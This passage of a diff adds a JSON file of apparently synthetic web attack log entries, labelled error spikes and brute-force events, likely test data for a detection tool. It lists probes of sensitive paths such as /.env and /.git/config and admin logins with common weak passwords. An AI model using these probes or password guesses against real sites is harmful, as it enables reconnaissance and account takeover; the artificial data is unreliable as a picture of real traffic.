+    "uri": "/config.php",
+    "status": 401,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 403,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 403,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/api/v1/users",
+    "status": 404,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/phpmyadmin",
+    "status": 404,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/backup.zip",
+    "status": 404,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 404,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 403,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 404,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.env",
+    "status": 500,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 500,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 401,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/phpmyadmin",
+    "status": 404,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/api/v1/users",
+    "status": 403,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.git/config",
+    "status": 404,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 500,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 404,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/api/v1/users",
+    "status": 403,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 404,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.env",
+    "status": 404,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/config.php",
+    "status": 404,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.env",
+    "status": 403,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=qwerty",
+    "status": 401,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=password",
+    "status": 401,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=qwerty",
+    "status": 401,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=letmein",
+    "status": 401,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=qwerty",
+    "status": 401,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=qwerty",
+    "status": 401,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=letmein",
+    "status": 401,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=admin",
+    "status": 401,
+    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=abc123",
+    "status": 401,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=admin",
+    "status": 401,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=admin",
+    "status": 401,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=qwerty",
+    "status": 401,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=password",
+    "status": 401,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=password",
+    "status": 401,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=123456",
+    "status": 401,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=admin",
+    "status": 401,
+    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=admin",
+    "status": 401,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "BRUTE_FORCE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "45.33.214.159",
+    "method": "POST",
+    "uri": "/login",
+    "body": "username=admin&password=password",
+    "status": 401,
+    "user_agent": "masscan/1.3"
+  }
+]
